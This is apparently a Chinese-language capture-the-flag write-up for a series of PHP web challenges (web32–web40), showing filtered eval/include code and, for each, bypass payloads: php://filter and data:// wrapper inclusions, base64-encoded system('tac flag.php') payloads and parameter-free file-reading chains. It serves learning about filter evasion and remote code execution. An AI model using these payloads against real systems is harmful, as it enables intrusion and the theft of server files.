#伪协议\n\n?c=include_$GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\ninclude函数:include是 PHP 中的文件包含函数，它的主要作用是将指定的文件内容包含到当前的 PHP 脚本中并执行。这意味着被包含文件中的 PHP 代码将在包含它的脚本的上下文中运行，就好像代码是直接写在包含它的脚本中一样。\n```\n\n这里过滤了反斜杠斜杠分号之类的\n\n思路是用include函数实现不用括号的文件包含,然后再配合伪协议,分号使用>?代替\n\n在这里我对于**include_$GET**这一内容不太理解去问sun师傅,孙师傅告诉我说是实现文件包含重造变量--重造了cmd这个传参然后使得传参不受限制了,**>?**代替了分号\n\n#### web33\n\n\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n} \n//过滤了双引号,完全可以照搬32的payload\n\n\n\n?c=include_$GET[lww]?\n>&lww=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\n```\n\n#### web34\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\n可以一样用上面的payload\n\n```\n\n#### web35\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n?c=include$_GET[cmd]?>&cmd=data://text/plan;base64;PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n#到这里有三种方法可以使用\n\n```\n\n过滤了，=号和<括号这里可以使用data的base64 把要执行的命令加密了传进去<?php system(\"cat flag.php\");?>\n\n```base\nPD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n```\n\n#### web36\n\n```\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=|\\/|[0-9]/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload;\n?c=include%0a$_GET[cmd]?>&cmd=php://filter/read=convert.base64-encode/resource=flag.php\n?c=include$_GET[cmd]?>&cmd=data://text/plan,<?php system(\"tac flag.php\")?>\n\n\n```\n\n这次是多加了0-9的传参也就是说c传参里面原来的GET[cmd]本来是任意取值的现在的参数里面不能有数字\n\n#### web37\n\n```\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\n?c=php://filter/read=convert.base64-encode/resource=flag.php #这里过滤了flag不要使用这一条没用 我只是都想测一遍用下面两个\n?c=data://text/palin,<?php system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web38\n\n```php\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    }\n\n}else{\n    highlight_file(__FILE__);\n}\ndata:// 是 PHP 支持的一个数据流包装协议，允许你使用数据（在这里是 PHP 代码）作为文件。\ntext/palin 是 data:// 协议的子类型，指定了数据的类型为纯文本。\n<?=system(\"tac f*\");?> 是 PHP 代码，使用 system 函数执行 tac f* 命令。\n    \n    payload:\n?c=data://text/palin,<?php system(\"tac f*\");?> #（使用不了用第二个我只是进行对比）这里php被过滤了使用不了可以改为短标签\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\n```\n\n#### web39\n\n```php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }//使用 preg_match 函数和正则表达式 /flag/i 检查 $c 中是否包含 flag（不区分大小写）。如果不包含，将 $c 后面添加 .php 后缀并使用 include 函数包含该文件。\n\n        \n}else{\n    highlight_file(__FILE__);\n}\npayload:\n?c=data://text/palin,<?=system(\"tac f*\");?>\n?c=data://text/palin,<?php system(\"tac f*\");?>\n\n```\n\n这个地方 include($c.\".php\");我有很大的疑问,就是豆包给的解释是`include($c.\".php\");`：将拼接后的字符串作为文件路径，尝试包含这个文件。如果文件存在，PHP 会将该文件的内容包含到当前文件中并执行；如果文件不存在，根据 PHP 的配置不同，可能会产生一个警告或错误（不过在这段代码中，由于 `error_reporting(0);` 的设置，错误不会显示）。\n\n但是这样解释是得不到flag的,于是我把sun师傅喊起来问他sun师傅解释一番但是我感觉不是很理解\n\n最后的结论是:\tc是data://text/palin,<?php system(\"tac f*\");?>后面衔接.php  但是这样理解是不对的   我的理解是在赋值的时候就已经进行命令执行了后面的.php实际上没有用到\t\n\n\n\n\n\n#### web40\n\n```php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n\npayload\n?c=print_r(show_source(array_rand(array_flip(scandir(pos(localeconv()))))));\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nnext()： 函数将内部指针指向数组中的下一个元素，并输出。\n?c=print_r(scandir(current(localeconv())));\nscandir(current(localeconv())) 查看当前目录所有文件名\n?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n\n```\n\n无参文件读取不是无回显\n\n过滤了很多字符 有大写得括号 这里得考点是：无参数文件读取 无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a('b')或a('b','c')，不能带参数 localeconv() 函数返回一包含本地数字及货币格式信息的数组。\ncurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，\npos() 同 current() ,是current()的别名\nreset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE\narray_reverse()：数组逆序\narray_flip()是交换数组的键和值\n","tags":["RCE"]}]